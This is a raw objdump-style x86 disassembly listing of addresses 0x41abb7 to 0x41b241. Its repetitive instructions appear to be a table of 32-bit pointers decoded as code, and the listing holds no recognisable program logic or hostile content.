  41abb7:	add    BYTE PTR [eax-0x6bffbe14],dl
  41abbd:	in     al,dx
  41abbe:	inc    ecx
  41abbf:	add    BYTE PTR [eax-0x63ffbe14],bl
  41abc5:	in     al,dx
  41abc6:	inc    ecx
  41abc7:	add    BYTE PTR [eax-0x5bffbe14],ah
  41abcd:	in     al,dx
  41abce:	inc    ecx
  41abcf:	add    BYTE PTR [eax-0x53ffbe14],ch
  41abd5:	in     al,dx
  41abd6:	inc    ecx
  41abd7:	add    BYTE PTR [eax-0x4bffbe14],dh
  41abdd:	in     al,dx
  41abde:	inc    ecx
  41abdf:	add    BYTE PTR [eax-0x43ffbe14],bh
  41abe5:	in     al,dx
  41abe6:	inc    ecx
  41abe7:	add    al,al
  41abe9:	in     al,dx
  41abea:	inc    ecx
  41abeb:	add    ah,al
  41abed:	in     al,dx
  41abee:	inc    ecx
  41abef:	add    al,cl
  41abf1:	in     al,dx
  41abf2:	inc    ecx
  41abf3:	add    ah,cl
  41abf5:	in     al,dx
  41abf6:	inc    ecx
  41abf7:	add    al,dl
  41abf9:	in     al,dx
  41abfa:	inc    ecx
  41abfb:	add    ah,dl
  41abfd:	in     al,dx
  41abfe:	inc    ecx
  41abff:	add    al,bl
  41ac01:	in     al,dx
  41ac02:	inc    ecx
  41ac03:	add    ah,bl
  41ac05:	in     al,dx
  41ac06:	inc    ecx
  41ac07:	add    al,ah
  41ac09:	in     al,dx
  41ac0a:	inc    ecx
  41ac0b:	add    ah,al
  41ac0d:	in     al,dx
  41ac0e:	inc    ecx
  41ac0f:	add    ah,ah
  41ac11:	in     al,dx
  41ac12:	inc    ecx
  41ac13:	add    al,ch
  41ac15:	in     al,dx
  41ac16:	inc    ecx
  41ac17:	add    ah,ch
  41ac19:	in     al,dx
  41ac1a:	inc    ecx
  41ac1b:	add    al,dh
  41ac1d:	in     al,dx
  41ac1e:	inc    ecx
  41ac1f:	add    ah,dh
  41ac21:	in     al,dx
  41ac22:	inc    ecx
  41ac23:	add    al,bh
  41ac25:	in     al,dx
  41ac26:	inc    ecx
  41ac27:	add    ah,bh
  41ac29:	in     al,dx
  41ac2a:	inc    ecx
  41ac2b:	add    BYTE PTR [eax],al
  41ac2d:	in     eax,dx
  41ac2e:	inc    ecx
  41ac2f:	add    BYTE PTR [ebp*8-0x12f7ffbf],al
  41ac36:	inc    ecx
  41ac37:	add    BYTE PTR [ebp*8-0x133fffbf],cl
  41ac3e:	inc    ecx
  41ac3f:	add    BYTE PTR [eax],dl
  41ac41:	in     eax,dx
  41ac42:	inc    ecx
  41ac43:	add    BYTE PTR [ebp*8-0x12e7ffbf],dl
  41ac4a:	inc    ecx
  41ac4b:	add    BYTE PTR [ebp*8-0x12dfffbf],bl
  41ac52:	inc    ecx
  41ac53:	add    BYTE PTR [ebp*8-0x12d7ffbf],ah
  41ac5a:	inc    ecx
  41ac5b:	add    BYTE PTR [ebp*8-0x12cfffbf],ch
  41ac62:	inc    ecx
  41ac63:	add    BYTE PTR [ebp*8-0x12ffffbf],dh
  41ac6a:	inc    ecx
  41ac6b:	add    BYTE PTR [eax],bh
  41ac6d:	in     eax,dx
  41ac6e:	inc    ecx
  41ac6f:	add    BYTE PTR [ebp*8-0x12bfffbf],bh
  41ac76:	inc    ecx
  41ac77:	add    BYTE PTR [ebp+ebp*8+0x41],al
  41ac7b:	add    BYTE PTR [eax-0x13],cl
  41ac7e:	inc    ecx
  41ac7f:	add    BYTE PTR [ebp+ebp*8+0x41],cl
  41ac83:	add    BYTE PTR [eax-0x13],dl
  41ac86:	inc    ecx
  41ac87:	add    BYTE PTR [ebp+ebp*8+0x41],dl
  41ac8b:	add    BYTE PTR [eax-0x13],bl
  41ac8e:	inc    ecx
  41ac8f:	add    BYTE PTR [ebp+ebp*8+0x41],bl
  41ac93:	add    BYTE PTR [eax-0x13],ah
  41ac96:	inc    ecx
  41ac97:	add    BYTE PTR [ebp+ebp*8+0x41],ah
  41ac9b:	add    BYTE PTR [eax-0x13],ch
  41ac9e:	inc    ecx
  41ac9f:	add    BYTE PTR [ebp+ebp*8+0x41],ch
  41aca3:	add    BYTE PTR [eax-0x13],dh
  41aca6:	inc    ecx
  41aca7:	add    BYTE PTR [ebp+ebp*8+0x41],dh
  41acab:	add    BYTE PTR [eax-0x13],bh
  41acae:	inc    ecx
  41acaf:	add    al,dh
  41acb1:	in     al,dx
  41acb2:	inc    ecx
  41acb3:	add    BYTE PTR [ebp+ebp*8+0x41],bh
  41acb7:	add    BYTE PTR [eax-0x7bffbe13],al
  41acbd:	in     eax,dx
  41acbe:	inc    ecx
  41acbf:	add    BYTE PTR [eax-0x73ffbe13],cl
  41acc5:	in     eax,dx
  41acc6:	inc    ecx
  41acc7:	add    BYTE PTR [eax-0x6bffbe13],dl
  41accd:	in     eax,dx
  41acce:	inc    ecx
  41accf:	add    BYTE PTR [eax-0x63ffbe13],bl
  41acd5:	in     eax,dx
  41acd6:	inc    ecx
  41acd7:	add    BYTE PTR [eax-0x5bffbe13],ah
  41acdd:	in     eax,dx
  41acde:	inc    ecx
  41acdf:	add    BYTE PTR [eax-0x53ffbe13],ch
  41ace5:	in     eax,dx
  41ace6:	inc    ecx
  41ace7:	add    BYTE PTR [eax-0x4bffbe13],dh
  41aced:	in     eax,dx
  41acee:	inc    ecx
  41acef:	add    BYTE PTR [eax-0x77ffbe13],bh
  41acf5:	in     al,dx
  41acf6:	inc    ecx
  41acf7:	add    BYTE PTR [ebp+ebp*8-0x123fffbf],bh
  41acfe:	inc    ecx
  41acff:	add    ah,al
  41ad01:	in     eax,dx
  41ad02:	inc    ecx
  41ad03:	add    al,cl
  41ad05:	in     eax,dx
  41ad06:	inc    ecx
  41ad07:	add    ah,cl
  41ad09:	in     eax,dx
  41ad0a:	inc    ecx
  41ad0b:	add    BYTE PTR [ebp+ebp*8-0x122fffbf],cl
  41ad12:	inc    ecx
  41ad13:	add    ah,dl
  41ad15:	in     eax,dx
  41ad16:	inc    ecx
  41ad17:	add    al,bl
  41ad19:	in     eax,dx
  41ad1a:	inc    ecx
  41ad1b:	add    ah,bl
  41ad1d:	in     eax,dx
  41ad1e:	inc    ecx
  41ad1f:	add    al,ah
  41ad21:	in     eax,dx
  41ad22:	inc    ecx
  41ad23:	add    ah,ah
  41ad25:	in     eax,dx
  41ad26:	inc    ecx
  41ad27:	add    al,ch
  41ad29:	in     eax,dx
  41ad2a:	inc    ecx
  41ad2b:	add    ah,ch
  41ad2d:	in     eax,dx
  41ad2e:	inc    ecx
  41ad2f:	add    al,dh
  41ad31:	in     eax,dx
  41ad32:	inc    ecx
  41ad33:	add    ah,dh
  41ad35:	in     eax,dx
  41ad36:	inc    ecx
  41ad37:	add    BYTE PTR [ebp+ebp*8-0x1207ffbf],ah
  41ad3e:	inc    ecx
  41ad3f:	add    ah,bh
  41ad41:	in     eax,dx
  41ad42:	inc    ecx
  41ad43:	add    BYTE PTR [eax],al
  41ad45:	out    dx,al
  41ad46:	inc    ecx
  41ad47:	add    BYTE PTR [esi+ebp*8],al
  41ad4a:	inc    ecx
  41ad4b:	add    ah,bh
  41ad4d:	in     eax,dx
  41ad4e:	inc    ecx
  41ad4f:	add    BYTE PTR [eax],cl
  41ad51:	out    dx,al
  41ad52:	inc    ecx
  41ad53:	add    BYTE PTR [esi+ebp*8],cl
  41ad56:	inc    ecx
  41ad57:	add    BYTE PTR [eax],dl
  41ad59:	out    dx,al
  41ad5a:	inc    ecx
  41ad5b:	add    ah,cl
  41ad5d:	in     al,dx
  41ad5e:	inc    ecx
  41ad5f:	add    BYTE PTR [esi+ebp*8],dl
  41ad62:	inc    ecx
  41ad63:	add    BYTE PTR [eax],bl
  41ad65:	out    dx,al
  41ad66:	inc    ecx
  41ad67:	add    BYTE PTR [eax],al
  41ad69:	in     eax,dx
  41ad6a:	inc    ecx
  41ad6b:	add    BYTE PTR [esi+ebp*8],bl
  41ad6e:	inc    ecx
  41ad6f:	add    BYTE PTR [eax],ah
  41ad71:	out    dx,al
  41ad72:	inc    ecx
  41ad73:	add    BYTE PTR [esi+ebp*8],ah
  41ad76:	inc    ecx
  41ad77:	add    BYTE PTR [eax],ch
  41ad79:	out    dx,al
  41ad7a:	inc    ecx
  41ad7b:	add    BYTE PTR [esi+ebp*8],ch
  41ad7e:	inc    ecx
  41ad7f:	add    BYTE PTR [eax],dh
  41ad81:	out    dx,al
  41ad82:	inc    ecx
  41ad83:	add    BYTE PTR [esi+ebp*8],dh
  41ad86:	inc    ecx
  41ad87:	add    BYTE PTR [eax],bh
  41ad89:	out    dx,al
  41ad8a:	inc    ecx
  41ad8b:	add    BYTE PTR [eax],ch
  41ad8d:	out    dx,al
  41ad8e:	inc    ecx
  41ad8f:	add    BYTE PTR [esi+ebp*8],bh
  41ad92:	inc    ecx
  41ad93:	add    BYTE PTR [eax-0x12],al
  41ad96:	inc    ecx
  41ad97:	add    BYTE PTR [esi+ebp*8+0x41],al
  41ad9b:	add    BYTE PTR [eax-0x12],cl
  41ad9e:	inc    ecx
  41ad9f:	add    BYTE PTR [esi+ebp*8+0x41],cl
  41ada3:	add    BYTE PTR [eax-0x12],dl
  41ada6:	inc    ecx
  41ada7:	add    BYTE PTR [esi+ebp*8+0x41],dl
  41adab:	add    BYTE PTR [eax-0x12],bl
  41adae:	inc    ecx
  41adaf:	add    BYTE PTR [esi+ebp*8+0x41],bl
  41adb3:	add    BYTE PTR [eax-0x12],ah
  41adb6:	inc    ecx
  41adb7:	add    BYTE PTR [esi+ebp*8+0x41],ah
  41adbb:	add    BYTE PTR [eax-0x12],ch
  41adbe:	inc    ecx
  41adbf:	add    BYTE PTR [esi+ebp*8+0x41],ch
  41adc3:	add    BYTE PTR [eax-0x12],dh
  41adc6:	inc    ecx
  41adc7:	add    BYTE PTR [esi+ebp*8+0x41],dh
  41adcb:	add    BYTE PTR [eax-0x12],bh
  41adce:	inc    ecx
  41adcf:	add    BYTE PTR [esi+ebp*8+0x41],bh
  41add3:	add    BYTE PTR [eax-0x7bffbe12],al
  41add9:	out    dx,al
  41adda:	inc    ecx
  41addb:	add    BYTE PTR [eax-0x73ffbe12],cl
  41ade1:	out    dx,al
  41ade2:	inc    ecx
  41ade3:	add    BYTE PTR [eax-0x3fffbe12],dl
  41ade9:	in     eax,dx
  41adea:	inc    ecx
  41adeb:	add    BYTE PTR [esi+ebp*8-0x1167ffbf],dl
  41adf2:	inc    ecx
  41adf3:	add    BYTE PTR [esi+ebp*8-0x115fffbf],bl
  41adfa:	inc    ecx
  41adfb:	add    BYTE PTR [ebp+ebp*8-0x115bffbf],ch
  41ae02:	inc    ecx
  41ae03:	add    BYTE PTR [eax-0x53ffbe12],ch
  41ae09:	out    dx,al
  41ae0a:	inc    ecx
  41ae0b:	add    BYTE PTR [eax-0x4bffbe12],dh
  41ae11:	out    dx,al
  41ae12:	inc    ecx
  41ae13:	add    BYTE PTR [eax-0x43ffbe12],bh
  41ae19:	out    dx,al
  41ae1a:	inc    ecx
  41ae1b:	add    al,al
  41ae1d:	out    dx,al
  41ae1e:	inc    ecx
  41ae1f:	add    ah,al
  41ae21:	out    dx,al
  41ae22:	inc    ecx
  41ae23:	add    BYTE PTR [esp+ebp*8-0x1137ffbf],dl
  41ae2a:	inc    ecx
  41ae2b:	add    ah,cl
  41ae2d:	out    dx,al
  41ae2e:	inc    ecx
  41ae2f:	add    al,dl
  41ae31:	out    dx,al
  41ae32:	inc    ecx
  41ae33:	add    ah,dl
  41ae35:	out    dx,al
  41ae36:	inc    ecx
  41ae37:	add    al,bl
  41ae39:	out    dx,al
  41ae3a:	inc    ecx
  41ae3b:	add    ah,bl
  41ae3d:	out    dx,al
  41ae3e:	inc    ecx
  41ae3f:	add    al,ah
  41ae41:	out    dx,al
  41ae42:	inc    ecx
  41ae43:	add    ah,ah
  41ae45:	out    dx,al
  41ae46:	inc    ecx
  41ae47:	add    al,ch
  41ae49:	out    dx,al
  41ae4a:	inc    ecx
  41ae4b:	add    ah,ch
  41ae4d:	out    dx,al
  41ae4e:	inc    ecx
  41ae4f:	add    BYTE PTR [eax-0x12],ah
  41ae52:	inc    ecx
  41ae53:	add    al,dh
  41ae55:	out    dx,al
  41ae56:	inc    ecx
  41ae57:	add    ah,dh
  41ae59:	out    dx,al
  41ae5a:	inc    ecx
  41ae5b:	add    al,bh
  41ae5d:	out    dx,al
  41ae5e:	inc    ecx
  41ae5f:	add    ah,bh
  41ae61:	out    dx,al
  41ae62:	inc    ecx
  41ae63:	add    BYTE PTR [eax],al
  41ae65:	out    dx,eax
  41ae66:	inc    ecx
  41ae67:	add    BYTE PTR [edi+ebp*8],al
  41ae6a:	inc    ecx
  41ae6b:	add    BYTE PTR [eax],cl
  41ae6d:	out    dx,eax
  41ae6e:	inc    ecx
  41ae6f:	add    BYTE PTR [edi+ebp*8],cl
  41ae72:	inc    ecx
  41ae73:	add    BYTE PTR [eax],dl
  41ae75:	out    dx,eax
  41ae76:	inc    ecx
  41ae77:	add    BYTE PTR [edi+ebp*8],dl
  41ae7a:	inc    ecx
  41ae7b:	add    BYTE PTR [eax],bl
  41ae7d:	out    dx,eax
  41ae7e:	inc    ecx
  41ae7f:	add    BYTE PTR [edi+ebp*8],bl
  41ae82:	inc    ecx
  41ae83:	add    BYTE PTR [eax],ah
  41ae85:	out    dx,eax
  41ae86:	inc    ecx
  41ae87:	add    BYTE PTR [edi+ebp*8],ah
  41ae8a:	inc    ecx
  41ae8b:	add    BYTE PTR [eax],ch
  41ae8d:	out    dx,eax
  41ae8e:	inc    ecx
  41ae8f:	add    BYTE PTR [edi+ebp*8],ch
  41ae92:	inc    ecx
  41ae93:	add    BYTE PTR [eax],dh
  41ae95:	out    dx,eax
  41ae96:	inc    ecx
  41ae97:	add    BYTE PTR [edi+ebp*8],dh
  41ae9a:	inc    ecx
  41ae9b:	add    BYTE PTR [eax],bh
  41ae9d:	out    dx,eax
  41ae9e:	inc    ecx
  41ae9f:	add    BYTE PTR [edi+ebp*8],bh
  41aea2:	inc    ecx
  41aea3:	add    BYTE PTR [eax-0x11],al
  41aea6:	inc    ecx
  41aea7:	add    BYTE PTR [edi+ebp*8+0x41],al
  41aeab:	add    BYTE PTR [eax-0x11],cl
  41aeae:	inc    ecx
  41aeaf:	add    BYTE PTR [edi+ebp*8+0x41],cl
  41aeb3:	add    BYTE PTR [eax-0x11],dl
  41aeb6:	inc    ecx
  41aeb7:	add    BYTE PTR [edi+ebp*8+0x41],dl
  41aebb:	add    BYTE PTR [eax-0x11],bl
  41aebe:	inc    ecx
  41aebf:	add    BYTE PTR [edi+ebp*8+0x41],bl
  41aec3:	add    BYTE PTR [eax-0x11],ah
  41aec6:	inc    ecx
  41aec7:	add    BYTE PTR [eax],bh
  41aec9:	out    dx,al
  41aeca:	inc    ecx
  41aecb:	add    BYTE PTR [edi+ebp*8+0x41],ah
  41aecf:	add    BYTE PTR [eax-0x11],ch
  41aed2:	inc    ecx
  41aed3:	add    BYTE PTR [edi+ebp*8+0x41],ch
  41aed7:	add    BYTE PTR [eax-0x11],dh
  41aeda:	inc    ecx
  41aedb:	add    BYTE PTR [edi+ebp*8+0x41],dh
  41aedf:	add    BYTE PTR [eax-0x11],bh
  41aee2:	inc    ecx
  41aee3:	add    BYTE PTR [edi+ebp*8+0x41],bh
  41aee7:	add    BYTE PTR [eax-0x7bffbe11],al
  41aeed:	out    dx,eax
  41aeee:	inc    ecx
  41aeef:	add    BYTE PTR [esi+ebp*8+0x41],dl
  41aef3:	add    BYTE PTR [eax],ch
  41aef5:	in     eax,dx
  41aef6:	inc    ecx
  41aef7:	add    BYTE PTR [eax-0x73ffbe11],cl
  41aefd:	out    dx,eax
  41aefe:	inc    ecx
  41aeff:	add    BYTE PTR [eax-0x11],bh
  41af02:	inc    ecx
  41af03:	add    BYTE PTR [eax+0x1c0041ef],dl
  41af09:	in     eax,dx
  41af0a:	inc    ecx
  41af0b:	add    BYTE PTR [edi+ebp*8+0x41],al
  41af0f:	add    BYTE PTR [edi+ebp*8-0x1067ffbf],dl
  41af16:	inc    ecx
  41af17:	add    BYTE PTR [edi+ebp*8-0x112bffbf],bl
  41af1e:	inc    ecx
  41af1f:	add    BYTE PTR [eax+0x400041ef],ah
  41af25:	out    dx,eax
  41af26:	inc    ecx
  41af27:	add    ah,al
  41af29:	in     al,dx
  41af2a:	inc    ecx
  41af2b:	add    BYTE PTR [edi+ebp*8-0x112bffbf],ah
  41af32:	inc    ecx
  41af33:	add    BYTE PTR [eax-0x53ffbe11],ch
  41af39:	out    dx,eax
  41af3a:	inc    ecx
  41af3b:	add    BYTE PTR [eax-0x4fffbe11],al
  41af41:	out    dx,eax
  41af42:	inc    ecx
  41af43:	add    BYTE PTR [edi+ebp*8-0x104bffbf],dh
  41af4a:	inc    ecx
  41af4b:	add    BYTE PTR [eax-0x43ffbe11],bh
  41af51:	out    dx,eax
  41af52:	inc    ecx
  41af53:	add    al,al
  41af55:	out    dx,eax
  41af56:	inc    ecx
  41af57:	add    ah,al
  41af59:	out    dx,eax
  41af5a:	inc    ecx
  41af5b:	add    al,cl
  41af5d:	out    dx,eax
  41af5e:	inc    ecx
  41af5f:	add    BYTE PTR [eax-0x33ffbe12],bh
  41af65:	out    dx,eax
  41af66:	inc    ecx
  41af67:	add    al,dl
  41af69:	out    dx,eax
  41af6a:	inc    ecx
  41af6b:	add    ah,dl
  41af6d:	out    dx,eax
  41af6e:	inc    ecx
  41af6f:	add    al,bl
  41af71:	out    dx,eax
  41af72:	inc    ecx
  41af73:	add    ah,bl
  41af75:	out    dx,eax
  41af76:	inc    ecx
  41af77:	add    al,ah
  41af79:	out    dx,eax
  41af7a:	inc    ecx
  41af7b:	add    BYTE PTR [eax],ch
  41af7d:	out    dx,al
  41af7e:	inc    ecx
  41af7f:	add    ah,ah
  41af81:	out    dx,eax
  41af82:	inc    ecx
  41af83:	add    al,ch
  41af85:	out    dx,eax
  41af86:	inc    ecx
  41af87:	add    BYTE PTR [esi+ebp*8-0x1013ffbf],ch
  41af8e:	inc    ecx
  41af8f:	add    al,cl
  41af91:	out    dx,al
  41af92:	inc    ecx
  41af93:	add    al,dh
  41af95:	out    dx,eax
  41af96:	inc    ecx
  41af97:	add    ah,dh
  41af99:	out    dx,eax
  41af9a:	inc    ecx
  41af9b:	add    BYTE PTR [esi+ebp*8-0x1007ffbf],dl
  41afa2:	inc    ecx
  41afa3:	add    BYTE PTR [eax-0xfffbe14],dl
  41afa9:	in     eax,dx
  41afaa:	inc    ecx
  41afab:	add    ah,bh
  41afad:	out    dx,eax
  41afae:	inc    ecx
  41afaf:	add    BYTE PTR [eax],al
  41afb1:	lock inc ecx
  41afb3:	add    BYTE PTR [eax+esi*8],al
  41afb6:	inc    ecx
  41afb7:	add    BYTE PTR [eax],cl
  41afb9:	lock inc ecx
  41afbb:	add    BYTE PTR [eax+esi*8],cl
  41afbe:	inc    ecx
  41afbf:	add    BYTE PTR [eax],dl
  41afc1:	lock inc ecx
  41afc3:	add    BYTE PTR [eax+0x140041ed],dh
  41afc9:	lock inc ecx
  41afcb:	add    ah,bh
  41afcd:	in     al,dx
  41afce:	inc    ecx
  41afcf:	add    BYTE PTR [esi+ebp*8+0x41],dh
  41afd3:	add    BYTE PTR [eax],bl
  41afd5:	lock inc ecx
  41afd7:	add    BYTE PTR [eax+esi*8],bl
  41afda:	inc    ecx
  41afdb:	add    BYTE PTR [eax],ah
  41afdd:	lock inc ecx
  41afdf:	add    BYTE PTR [eax+esi*8],ah
  41afe2:	inc    ecx
  41afe3:	add    BYTE PTR [eax],ch
  41afe5:	lock inc ecx
  41afe7:	add    BYTE PTR [edi+ebp*8-0xfd3ffbf],dl
  41afee:	inc    ecx
  41afef:	add    BYTE PTR [eax],dh
  41aff1:	lock inc ecx
  41aff3:	add    BYTE PTR [eax+esi*8],dh
  41aff6:	inc    ecx
  41aff7:	add    BYTE PTR [eax],bh
  41aff9:	lock inc ecx
  41affb:	add    BYTE PTR [eax+esi*8],bh
  41affe:	inc    ecx
  41afff:	add    BYTE PTR [eax-0x10],al
  41b002:	inc    ecx
  41b003:	add    BYTE PTR [eax+esi*8+0x41],al
  41b007:	add    BYTE PTR [eax+0x480041ee],dl
  41b00d:	lock inc ecx
  41b00f:	add    BYTE PTR [eax+esi*8+0x41],cl
  41b013:	add    ah,bh
  41b015:	in     al,dx
  41b016:	inc    ecx
  41b017:	add    BYTE PTR [eax-0x11],dh
  41b01a:	inc    ecx
  41b01b:	add    BYTE PTR [eax-0x10],dl
  41b01e:	inc    ecx
  41b01f:	add    BYTE PTR [eax+esi*8+0x41],dl
  41b023:	add    BYTE PTR [eax-0x10],bl
  41b026:	inc    ecx
  41b027:	add    BYTE PTR [eax+esi*8+0x41],bl
  41b02b:	add    BYTE PTR [eax],bl
  41b02d:	out    dx,al
  41b02e:	inc    ecx
  41b02f:	add    BYTE PTR [eax-0x10],ah
  41b032:	inc    ecx
  41b033:	add    BYTE PTR [eax+esi*8+0x41],ah
  41b037:	add    BYTE PTR [esp+ebp*8+0x41],bh
  41b03b:	add    BYTE PTR [esp+esi*8+0x41],bl
  41b03f:	add    BYTE PTR [eax-0xc],ah
  41b042:	inc    ecx
  41b043:	add    BYTE PTR [esp+esi*8+0x41],ah
  41b047:	add    BYTE PTR [eax-0xc],ch
  41b04a:	inc    ecx
  41b04b:	add    BYTE PTR [esp+esi*8+0x41],ch
  41b04f:	add    BYTE PTR [eax-0xc],dh
  41b052:	inc    ecx
  41b053:	add    BYTE PTR [esp+esi*8+0x41],dh
  41b057:	add    BYTE PTR [eax-0xc],bh
  41b05a:	inc    ecx
  41b05b:	add    BYTE PTR [esp+esi*8+0x41],bh
  41b05f:	add    BYTE PTR [eax+0x780041f4],al
  41b065:	hlt    
  41b066:	inc    ecx
  41b067:	add    BYTE PTR [esp+esi*8-0xb77ffbf],al
  41b06e:	inc    ecx
  41b06f:	add    BYTE PTR [esp+esi*8-0xb8bffbf],cl
  41b076:	inc    ecx
  41b077:	add    BYTE PTR [eax-0x6bffbe0c],dl
  41b07d:	hlt    
  41b07e:	inc    ecx
  41b07f:	add    BYTE PTR [eax-0x63ffbe0c],bl
  41b085:	hlt    
  41b086:	inc    ecx
  41b087:	add    BYTE PTR [eax-0x5bffbe0c],ah
  41b08d:	hlt    
  41b08e:	inc    ecx
  41b08f:	add    BYTE PTR [eax-0x53ffbe0c],ch
  41b095:	hlt    
  41b096:	inc    ecx
  41b097:	add    BYTE PTR [eax-0x4bffbe0c],dh
  41b09d:	hlt    
  41b09e:	inc    ecx
  41b09f:	add    BYTE PTR [eax-0x43ffbe0c],bh
  41b0a5:	hlt    
  41b0a6:	inc    ecx
  41b0a7:	add    al,al
  41b0a9:	hlt    
  41b0aa:	inc    ecx
  41b0ab:	add    ah,al
  41b0ad:	hlt    
  41b0ae:	inc    ecx
  41b0af:	add    al,cl
  41b0b1:	hlt    
  41b0b2:	inc    ecx
  41b0b3:	add    ah,cl
  41b0b5:	hlt    
  41b0b6:	inc    ecx
  41b0b7:	add    al,dl
  41b0b9:	hlt    
  41b0ba:	inc    ecx
  41b0bb:	add    ah,dl
  41b0bd:	hlt    
  41b0be:	inc    ecx
  41b0bf:	add    al,bl
  41b0c1:	hlt    
  41b0c2:	inc    ecx
  41b0c3:	add    ah,bl
  41b0c5:	hlt    
  41b0c6:	inc    ecx
  41b0c7:	add    al,ah
  41b0c9:	hlt    
  41b0ca:	inc    ecx
  41b0cb:	add    ah,ah
  41b0cd:	hlt    
  41b0ce:	inc    ecx
  41b0cf:	add    al,ch
  41b0d1:	hlt    
  41b0d2:	inc    ecx
  41b0d3:	add    ah,ch
  41b0d5:	hlt    
  41b0d6:	inc    ecx
  41b0d7:	add    al,dh
  41b0d9:	hlt    
  41b0da:	inc    ecx
  41b0db:	add    ah,dh
  41b0dd:	hlt    
  41b0de:	inc    ecx
  41b0df:	add    al,bh
  41b0e1:	hlt    
  41b0e2:	inc    ecx
  41b0e3:	add    ah,bh
  41b0e5:	hlt    
  41b0e6:	inc    ecx
  41b0e7:	add    BYTE PTR [eax],al
  41b0e9:	cmc    
  41b0ea:	inc    ecx
  41b0eb:	add    BYTE PTR [esi*8-0xaf7ffbf],al
  41b0f2:	inc    ecx
  41b0f3:	add    BYTE PTR [esi*8-0xaefffbf],cl
  41b0fa:	inc    ecx
  41b0fb:	add    BYTE PTR [esi*8-0xae7ffbf],dl
  41b102:	inc    ecx
  41b103:	add    BYTE PTR [esi*8-0xadfffbf],bl
  41b10a:	inc    ecx
  41b10b:	add    BYTE PTR [esi*8-0xad7ffbf],ah
  41b112:	inc    ecx
  41b113:	add    BYTE PTR [esi*8-0xacfffbf],ch
  41b11a:	inc    ecx
  41b11b:	add    BYTE PTR [esi*8-0xacbffbf],ch
  41b122:	inc    ecx
  41b123:	add    BYTE PTR [eax],bh
  41b125:	cmc    
  41b126:	inc    ecx
  41b127:	add    BYTE PTR [esi*8-0xabfffbf],bh
  41b12e:	inc    ecx
  41b12f:	add    BYTE PTR [ebp+esi*8+0x41],al
  41b133:	add    BYTE PTR [eax+0x480041f4],dh
  41b139:	cmc    
  41b13a:	inc    ecx
  41b13b:	add    BYTE PTR [ebp+esi*8+0x41],cl
  41b13f:	add    BYTE PTR [eax-0xb],dl
  41b142:	inc    ecx
  41b143:	add    BYTE PTR [ebp+esi*8+0x41],dl
  41b147:	add    BYTE PTR [esp+esi*8+0x41],bl
  41b14b:	add    BYTE PTR [eax-0xb],bl
  41b14e:	inc    ecx
  41b14f:	add    BYTE PTR [eax],al
  41b151:	cmc    
  41b152:	inc    ecx
  41b153:	add    BYTE PTR [esp+esi*8+0x41],ah
  41b157:	add    BYTE PTR [ebp+esi*8+0x41],bl
  41b15b:	add    BYTE PTR [eax-0xb],ah
  41b15e:	inc    ecx
  41b15f:	add    BYTE PTR [ebp+esi*8+0x41],ah
  41b163:	add    BYTE PTR [eax-0xb],ch
  41b166:	inc    ecx
  41b167:	add    BYTE PTR [ebp+esi*8+0x41],ch
  41b16b:	add    BYTE PTR [eax-0xb],dh
  41b16e:	inc    ecx
  41b16f:	add    al,ch
  41b171:	hlt    
  41b172:	inc    ecx
  41b173:	add    BYTE PTR [ebp+esi*8+0x41],dh
  41b177:	add    BYTE PTR [eax-0xb],bh
  41b17a:	inc    ecx
  41b17b:	add    BYTE PTR [ebp+esi*8+0x41],bh
  41b17f:	add    BYTE PTR [ebp+esi*8+0x41],bl
  41b183:	add    BYTE PTR [eax-0x7bffbe0b],al
  41b189:	cmc    
  41b18a:	inc    ecx
  41b18b:	add    BYTE PTR [eax-0xb],bl
  41b18e:	inc    ecx
  41b18f:	add    ah,dl
  41b191:	hlt    
  41b192:	inc    ecx
  41b193:	add    BYTE PTR [ebp+esi*8+0x41],cl
  41b197:	add    BYTE PTR [eax-0x73ffbe0b],cl
  41b19d:	cmc    
  41b19e:	inc    ecx
  41b19f:	add    BYTE PTR [eax-0x6bffbe0b],dl
  41b1a5:	cmc    
  41b1a6:	inc    ecx
  41b1a7:	add    BYTE PTR [eax-0x63ffbe0b],bl
  41b1ad:	cmc    
  41b1ae:	inc    ecx
  41b1af:	add    BYTE PTR [eax-0x5bffbe0b],ah
  41b1b5:	cmc    
  41b1b6:	inc    ecx
  41b1b7:	add    BYTE PTR [eax-0x53ffbe0b],ch
  41b1bd:	cmc    
  41b1be:	inc    ecx
  41b1bf:	add    BYTE PTR [esp+esi*8+0x41],ah
  41b1c3:	add    BYTE PTR [eax-0xb],ah
  41b1c6:	inc    ecx
  41b1c7:	add    BYTE PTR [ebp+esi*8+0x41],dh
  41b1cb:	add    BYTE PTR [eax-0x4bffbe0b],dh
  41b1d1:	cmc    
  41b1d2:	inc    ecx
  41b1d3:	add    BYTE PTR [eax-0x43ffbe0b],bh
  41b1d9:	cmc    
  41b1da:	inc    ecx
  41b1db:	add    al,al
  41b1dd:	cmc    
  41b1de:	inc    ecx
  41b1df:	add    ah,al
  41b1e1:	cmc    
  41b1e2:	inc    ecx
  41b1e3:	add    al,ah
  41b1e5:	hlt    
  41b1e6:	inc    ecx
  41b1e7:	add    al,cl
  41b1e9:	cmc    
  41b1ea:	inc    ecx
  41b1eb:	add    ah,cl
  41b1ed:	cmc    
  41b1ee:	inc    ecx
  41b1ef:	add    al,dl
  41b1f1:	cmc    
  41b1f2:	inc    ecx
  41b1f3:	add    ah,dl
  41b1f5:	cmc    
  41b1f6:	inc    ecx
  41b1f7:	add    al,bl
  41b1f9:	cmc    
  41b1fa:	inc    ecx
  41b1fb:	add    ah,bl
  41b1fd:	cmc    
  41b1fe:	inc    ecx
  41b1ff:	add    al,ah
  41b201:	cmc    
  41b202:	inc    ecx
  41b203:	add    BYTE PTR [eax-0xc],bh
  41b206:	inc    ecx
  41b207:	add    BYTE PTR [eax-0x6bffbe0c],bl
  41b20d:	cmc    
  41b20e:	inc    ecx
  41b20f:	add    ah,ah
  41b211:	cmc    
  41b212:	inc    ecx
  41b213:	add    al,ch
  41b215:	cmc    
  41b216:	inc    ecx
  41b217:	add    ah,ch
  41b219:	cmc    
  41b21a:	inc    ecx
  41b21b:	add    BYTE PTR [eax-0xfffbe0b],dh
  41b221:	cmc    
  41b222:	inc    ecx
  41b223:	add    ah,dh
  41b225:	cmc    
  41b226:	inc    ecx
  41b227:	add    al,bh
  41b229:	cmc    
  41b22a:	inc    ecx
  41b22b:	add    BYTE PTR [eax-0x3ffbe0b],dl
  41b231:	cmc    
  41b232:	inc    ecx
  41b233:	add    BYTE PTR [eax],al
  41b235:	test   BYTE PTR [ecx+0x0],0x4
  41b239:	test   BYTE PTR [ecx+0x0],0x8
  41b23d:	test   BYTE PTR [ecx+0x0],0xc
  41b241:	test   BYTE PTR [ecx+0x0],0x90
